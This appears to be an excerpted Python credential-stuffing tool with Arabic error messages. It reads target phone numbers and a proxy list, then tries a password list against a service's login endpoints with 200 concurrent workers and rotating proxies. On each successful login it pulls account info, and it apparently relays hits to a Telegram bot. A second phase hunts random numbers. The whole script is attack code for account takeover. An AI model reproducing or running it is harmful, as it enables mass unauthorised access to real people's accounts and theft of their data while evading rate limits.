...
# ==================== TARGET ACCOUNTS & PROXIES ====================#
TARGET_FILE = "numbers.txt"
PROXY_FILE = "proxy_list.txt"

TARGET_ACCOUNTS = []   # list of phone strings
PROXY_LIST = []        # list of "ip:port"
PROXY_MODE = False     # set in main()
...
def load_targets():
    ...
    try:
        ...
        print(f"{R}[!] خطأ بقراءة {TARGET_FILE}: {e}{W}")
        ...
        with open(PROXY_FILE, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                ...
                if not line or line.startswith("#"):
                    continue
                # Accept ip:port or http://ip:port
                if "://" in line:
                    line = line.split("://", 1)[1]
                if ":" in line:
                    proxies.append(line)
    except Exception as e:
        print(f"{R}[!] خطأ بقراءة {PROXY_FILE}: {e}{W}")
    return proxies

TARGET_ACCOUNTS = load_targets()
...
# ==================== ASYNC SESSION POOL ====================#
class SessionPool:
    def __init__(self, pool_size=50, use_proxy=False, proxies=None):
    ...
    async def get_session(self):
        async with self.lock:
            ...
            if self.use_proxy and self.proxies:
                proxy = parse_proxy(random.choice(self.proxies))
...
# ==================== ASYNC LOGIN ====================#
async def login_async(session, mobile, password, proxy=None):
    device_info = generate_device_info()
    body = json.dumps({
    ...
    for domain in DOMAINS:
        ...
        try:
            async with session.post(url, data=wire, headers=headers, proxy=proxy) as resp:
                if resp.status == 200:
...
async def fetchinfo_async(session, token, uid, account, proxy=None):
    device_info = generate_device_info()
    body = json.dumps({
    ...
    for host in INFOHOSTS:
        try:
            async with session.post(host + infopath, data=wire, headers=headers, proxy=proxy) as resp:
                if resp.status == 200:
...
# ==================== ASYNC CHECK ====================#
async def check_number_async(session, mobile, proxy=None):
    ...
    for pwd in PASSWORDS:
        ...
        try:
            login_result, hera = await login_async(session, mobile, pwd, proxy=proxy)
            ...
            if status == 0:
                ...
                info_result = await fetchinfo_async(session, token, uid, uid, proxy=proxy)
                base_info = {}
...
def print_dashboard():
    ...
    print(f"{xp} PROXY      {xpxx} {G}{'ON ('+str(len(PROXY_LIST))+')' if PROXY_MODE else 'OFF'}{W}")
    print(f"{xp} TARGETS    {xpxx} {P}{len(TARGET_ACCOUNTS)}{W}")
...
# ==================== MAIN ASYNC ====================#
async def worker_random(session_pool, semaphore):
    while not stop_flag:
        async with semaphore:
            ...
            try:
                ...
                await check_number_async(session, mobile, proxy=proxy)
            finally:
                await session_pool.return_session(session)

async def worker_targets(session_pool, semaphore, queue):
    while not stop_flag:
        try:
            mobile = queue.popleft()
        except IndexError:
            return
        async with semaphore:
            session = await session_pool.get_session()
...
async def main_async():
    global stop_flag, BOT_TOKEN, CHAT_ID, PROXY_MODE
    ...
    print(f"{R}Target accounts loaded: {len(TARGET_ACCOUNTS)}{W}")
    print(f"{R}Proxies loaded: {len(PROXY_LIST)}{W}")
    
    proxy_choice = input(f"{R}Use proxies? (y/n): {W}").strip().lower()
    PROXY_MODE = (proxy_choice == "y" and len(PROXY_LIST) > 0)
    print(f"{R}Proxy mode: {'ON' if PROXY_MODE else 'OFF'}{W}")
    
    print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{xp} {G}Starting with 200 concurrent connections...{W}")
    
    session_pool = SessionPool(pool_size=100, use_proxy=PROXY_MODE, proxies=PROXY_LIST)
    ...
    # Phase 1: targets from numbers.txt
    if TARGET_ACCOUNTS:
        target_queue = deque(TARGET_ACCOUNTS)
        print(f"{xp} {G}Phase 1: Targets ({len(TARGET_ACCOUNTS)}){W}")
        workers = []
        for _ in range(200):
            workers.append(asyncio.create_task(worker_targets(session_pool, semaphore, target_queue)))
        try:
    ...
    # Phase 2: random
    if not stop_flag:
        print(f"{xp} {G}Phase 2: Random hunting...{W}")
        workers = []
        for _ in range(200):
            workers.append(asyncio.create_task(worker_random(session_pool, semaphore)))
        try:
            while not stop_flag:
